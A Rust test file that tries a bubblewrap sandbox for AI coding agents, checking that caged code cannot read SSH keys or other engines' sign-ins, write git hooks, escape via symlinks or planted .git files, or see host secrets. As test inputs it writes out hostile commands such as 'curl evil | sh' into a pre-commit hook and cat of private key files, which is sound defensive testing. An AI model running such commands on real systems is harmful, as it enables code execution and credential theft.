//! The sandbox, tried for real: what an agent's own code can and can't reach.
//! Skipped (with a note) where bubblewrap can't run.
#![cfg(target_os = "linux")]

use std::fs;
use std::path::{Path, PathBuf};
use std::process::Command;
use ysob_engine::lanes::Lane;
use ysob_engine::sandbox::{self, Spec};

struct World {
    _t: tempfile::TempDir,
    home: PathBuf,
    data: PathBuf,
    mission: PathBuf,
}

fn world() -> World {
    let t = tempfile::tempdir().unwrap();
    let home = t.path().join("home");
    let data = home.join(".ysob");
    let mission = t.path().join("work").join("shop");
    for d in [home.join(".ssh"), home.join(".claude"), data.clone(), mission.join(".git/hooks"), mission.join("src")] {
        fs::create_dir_all(d).unwrap();
    }
    fs::write(home.join(".ssh/id_ed25519"), "PRIVATE KEY").unwrap();
    fs::write(home.join(".claude/.credentials.json"), "{\"token\":1}").unwrap();
    fs::write(home.join(".claude/history.jsonl"), "every prompt ever").unwrap();
    fs::write(data.join("hold.db"), "the engine's data").unwrap();
    fs::write(mission.join(".git/config"), "[core]").unwrap();
    fs::write(mission.join("src/app.js"), "x").unwrap();
    World { _t: t, home, data, mission }
}

/// Runs a shell line inside the cage and returns (exit ok, stdout).
fn run(w: &World, lane: Lane, line: &str) -> (bool, String) {
    run_with(w, lane, line, None)
}

fn run_with(w: &World, lane: Lane, line: &str, git: Option<(PathBuf, PathBuf)>) -> (bool, String) {
    let agent_home = w.data.join("agents/a1/home");
    let env = vec![("PATH".to_string(), "/usr/local/bin:/usr/bin:/bin".to_string())];
    let spec = Spec {
        lane, engine: "claude", mission: &w.mission, home: &w.home, agent_home: &agent_home, data_dir: &w.data,
        programs: &[PathBuf::from("/bin/sh")], sock: None, pty: false, share: &[], git, env: &env,
    };
    let args = sandbox::args(&spec).unwrap();
    // As the engine does it: bwrap starts with only the cage's environment, never on its argv.
    let out = Command::new("bwrap").args(args).args(["/bin/sh", "-c", line]).env_clear().envs(sandbox::env(&spec)).output().unwrap();
    (out.status.success(), String::from_utf8_lossy(&out.stdout).trim().to_string())
}

fn skip() -> bool {
    if !sandbox::available() {
        eprintln!("bubblewrap can't run here: {}", sandbox::missing_reason());
        return true;
    }
    false
}

#[test]
fn edit_lane_writes_its_mission_and_nothing_else() {
    if skip() {
        return;
    }
    let w = world();
    let m = w.mission.display();
    let h = w.home.display();
    assert!(run(&w, Lane::Write, &format!("echo built > {m}/src/new.js")).0, "can't write its own mission");
    assert_eq!(fs::read_to_string(w.mission.join("src/new.js")).unwrap().trim(), "built");
    // The real home is an empty, throwaway folder in there: nothing written lands on disk.
    let _ = run(&w, Lane::Write, &format!("echo pwned > {h}/.bashrc"));
    assert!(!w.home.join(".bashrc").exists(), "a write escaped into the real home");
    let outside = w.mission.parent().unwrap().join("other.txt");
    let _ = run(&w, Lane::Write, &format!("echo pwned > {}", outside.display()));
    assert!(!outside.exists(), "a write escaped beside the mission");
}

#[test]
fn secrets_the_engine_data_and_other_sessions_are_out_of_sight() {
    if skip() {
        return;
    }
    let w = world();
    let h = w.home.display();
    for f in [format!("{h}/.ssh/id_ed25519"), format!("{h}/.claude/history.jsonl"), format!("{}/hold.db", w.data.display())] {
        let (ok, out) = run(&w, Lane::Write, &format!("cat {f}"));
        assert!(!ok && out.is_empty(), "{f} is readable from the cage: {out}");
    }
    // The engine's sign-in is there, because the agent needs it to talk to its model.
    let (ok, out) = run(&w, Lane::Write, &format!("cat {h}/.claude/.credentials.json"));
    assert!(ok && out.contains("token"), "the sign-in file is missing: {out}");
    // Its own process table: no host processes to read secrets out of.
    let (_, out) = run(&w, Lane::Write, "ls /proc | grep -c '^[0-9]'");
    assert!(out.parse::<u32>().unwrap() < 10, "host processes are visible: {out}");
}

#[test]
fn rigging_stays_read_only_inside_a_writable_mission() {
    if skip() {
        return;
    }
    let w = world();
    let m = w.mission.display();
    for f in [format!("{m}/.git/hooks/pre-commit"), format!("{m}/.git/config"), format!("{m}/.claude/settings.json")] {
        let (ok, _) = run(&w, Lane::Write, &format!("echo 'curl evil | sh' > {f}"));
        assert!(!ok, "{f} was writable");
    }
    assert_eq!(fs::read_to_string(w.mission.join(".git/config")).unwrap(), "[core]");
    assert!(!w.mission.join(".git/hooks/pre-commit").exists());
}

#[test]
fn look_lane_cant_write_even_by_running_code() {
    if skip() {
        return;
    }
    let w = world();
    let (ok, _) = run(&w, Lane::Read, &format!("echo x > {}/src/app.js", w.mission.display()));
    assert!(!ok);
    assert_eq!(fs::read_to_string(w.mission.join("src/app.js")).unwrap(), "x");
    let (ok, out) = run(&w, Lane::Read, &format!("cat {}/src/app.js", w.mission.display()));
    assert!(ok && out == "x");
}

#[test]
fn a_symlink_planted_in_the_mission_leads_nowhere() {
    if skip() {
        return;
    }
    let w = world();
    std::os::unix::fs::symlink(w.home.join(".ssh/id_ed25519"), w.mission.join("key")).unwrap();
    let (ok, out) = run(&w, Lane::Write, &format!("cat {}/key", w.mission.display()));
    assert!(!ok && !out.contains("PRIVATE"), "followed a symlink out: {out}");
}

#[test]
fn a_worktree_can_use_git_but_not_its_hooks() {
    if skip() {
        return;
    }
    let w = world();
    let git = |dir: &Path, a: &[&str]| assert!(Command::new("git").arg("-C").arg(dir).args(a).output().unwrap().status.success(), "git {a:?}");
    let repo = w.mission.parent().unwrap().join("repo");
    fs::create_dir_all(&repo).unwrap();
    git(&repo, &["init", "-q", "-b", "main"]);
    fs::write(repo.join("a.txt"), "1").unwrap();
    git(&repo, &["add", "."]);
    git(&repo, &["-c", "user.name=t", "-c", "user.email=t@t", "commit", "-qm", "one"]);
    let wt = repo.join(".ysob/worktrees/moose");
    git(&repo, &["worktree", "add", "-q", "-b", "ysob/moose", wt.to_str().unwrap()]);
    let w2 = World { mission: wt.clone(), ..w };
    let git = Some((repo.join(".git/worktrees/moose"), repo.join(".git")));
    let (ok, out) = run_with(&w2, Lane::Write, "echo 2 > a.txt && git status --short && git diff --stat", git.clone());
    assert!(ok && out.contains("a.txt"), "git in the worktree failed: {out}");
    let (ok, _) = run_with(&w2, Lane::Write, &format!("echo evil > {}/.git/hooks/post-merge", repo.display()), git.clone());
    assert!(!ok, "the main repo's hooks were writable from a worktree");
    // Review C1/C2: the agent can't redirect git by rewriting its .git file or the gitdir.
    let (ok, _) = run_with(&w2, Lane::Write, "echo 'gitdir: /tmp' > .git", git.clone());
    assert!(!ok, "the worktree's .git file was writable");
    let (ok, _) = run_with(&w2, Lane::Write, &format!("echo /tmp > {}/.git/worktrees/moose/commondir", repo.display()), git);
    assert!(!ok, "the gitdir's commondir was writable");
}

#[test]
fn a_planted_git_file_never_brings_the_home_folder_in() {
    if skip() {
        return;
    }
    let w = world();
    // Review C1: in a mission that isn't a repo, an agent writes `.git` pointing at the home folder.
    fs::remove_dir_all(w.mission.join(".git")).unwrap();
    fs::write(w.mission.join(".git"), format!("gitdir: {}\n", w.home.display())).unwrap();
    let (ok, out) = run(&w, Lane::Write, &format!("cat {}/.ssh/id_ed25519", w.home.display()));
    assert!(!ok && !out.contains("PRIVATE"), "the home folder came back through a .git file: {out}");
    let (ok, _) = run(&w, Lane::Write, "echo 'gitdir: /' > .git");
    assert!(!ok, "a .git file in the mission was writable");
}

#[test]
fn run_is_hidden_and_the_environment_is_clean() {
    if skip() {
        return;
    }
    let w = world();
    // Review C5: sockets under /run (docker's is root) are out of reach.
    let (_, out) = run(&w, Lane::Write, "ls -A /run | grep -v '^systemd$' | wc -l");
    assert_eq!(out, "0", "/run is visible");
    // Review H1: secrets in the engine's environment never reach an agent's code.
    std::env::set_var("YSOB_TEST_SECRET_API_KEY", "sk-should-not-leak");
    let (_, out) = run(&w, Lane::Write, "env");
    std::env::remove_var("YSOB_TEST_SECRET_API_KEY");
    assert!(!out.contains("sk-should-not-leak"), "the environment leaked: {out}");
    assert!(out.contains("PATH=/usr/local/bin"), "what the engine passes still arrives");
}

#[test]
fn the_squads_checkouts_are_read_only_to_an_agent_in_the_main_checkout() {
    if skip() {
        return;
    }
    let w = world();
    fs::create_dir_all(w.mission.join(".ysob/worktrees/doc")).unwrap();
    let (ok, _) = run(&w, Lane::Write, &format!("echo x > {}/.ysob/worktrees/doc/plant.js", w.mission.display()));
    assert!(!ok, "the boss could write into a squadmate's checkout");
}

#[test]
fn every_engine_gets_its_own_sign_in_and_only_that() {
    if skip() {
        return;
    }
    let w = world();
    for (rel, body) in [(".local/share/opencode/auth.json", "opencode-token"), (".qwen/oauth_creds.json", "qwen-token")] {
        let f = w.home.join(rel);
        fs::create_dir_all(f.parent().unwrap()).unwrap();
        fs::write(f, body).unwrap();
    }
    // A config naming a key folder is ignored.
    fs::write(w.data.join("engines.json"), r#"[{"id": "sneaky", "name": "S", "bin": "sneaky", "auth_files": [".ssh/id_ed25519"]}]"#).unwrap();
    let see = |engine: &str, rel: &str| {
        let agent_home = w.data.join(format!("agents/{engine}/home"));
        let env = vec![("PATH".to_string(), "/usr/bin:/bin".to_string())];
        let spec = Spec {
            lane: Lane::Write, engine, mission: &w.mission, home: &w.home, agent_home: &agent_home, data_dir: &w.data,
            programs: &[PathBuf::from("/bin/sh")], sock: None, pty: true, share: &[], git: None, env: &env,
        };
        let args = sandbox::args(&spec).unwrap();
        let line = format!("cat {}/{rel} 2>/dev/null", w.home.display());
        let out = Command::new("bwrap").args(args).args(["/bin/sh", "-c", &line]).env_clear().envs(sandbox::env(&spec)).output().unwrap();
        String::from_utf8_lossy(&out.stdout).trim().to_string()
    };
    assert_eq!(see("opencode", ".local/share/opencode/auth.json"), "opencode-token", "OpenCode is signed in inside the cage");
    assert_eq!(see("opencode", ".qwen/oauth_creds.json"), "", "but can't read Qwen's sign-in");
    assert_eq!(see("qwen", ".qwen/oauth_creds.json"), "qwen-token");
    assert_eq!(see("sneaky", ".ssh/id_ed25519"), "", "a config can't pull keys in");
}

#[test]
fn secrets_never_go_on_the_command_line() {
    // Review 2026-11-14 H2: a process's arguments are readable by every local user
    // (/proc/<pid>/cmdline), so sign-in keys travel in bwrap's environment instead.
    let w = world();
    let agent_home = w.data.join("agents/a1/home");
    let env = vec![("PATH".to_string(), "/usr/bin:/bin".to_string()), ("ANTHROPIC_API_KEY".to_string(), "sk-test-not-on-argv".to_string())];
    let spec = Spec {
        lane: Lane::Write, engine: "claude", mission: &w.mission, home: &w.home, agent_home: &agent_home, data_dir: &w.data,
        programs: &[PathBuf::from("/bin/sh")], sock: None, pty: false, share: &[], git: None, env: &env,
    };
    let args = sandbox::args(&spec).unwrap();
    assert!(!args.iter().any(|a| a.to_string_lossy().contains("sk-test-not-on-argv")), "a secret is on the command line");
    let e = sandbox::env(&spec);
    assert!(e.iter().any(|(k, v)| k == "ANTHROPIC_API_KEY" && v == "sk-test-not-on-argv"), "the key still reaches the cage");
    assert!(e.iter().any(|(k, _)| k == "HOME"), "HOME is set");
    if skip() {
        return;
    }
    let out = Command::new("bwrap").args(&args).args(["/bin/sh", "-c", "echo $ANTHROPIC_API_KEY"]).env_clear().envs(e.iter().map(|(k, v)| (k, v))).output().unwrap();
    assert_eq!(String::from_utf8_lossy(&out.stdout).trim(), "sk-test-not-on-argv", "the key arrives inside");
}
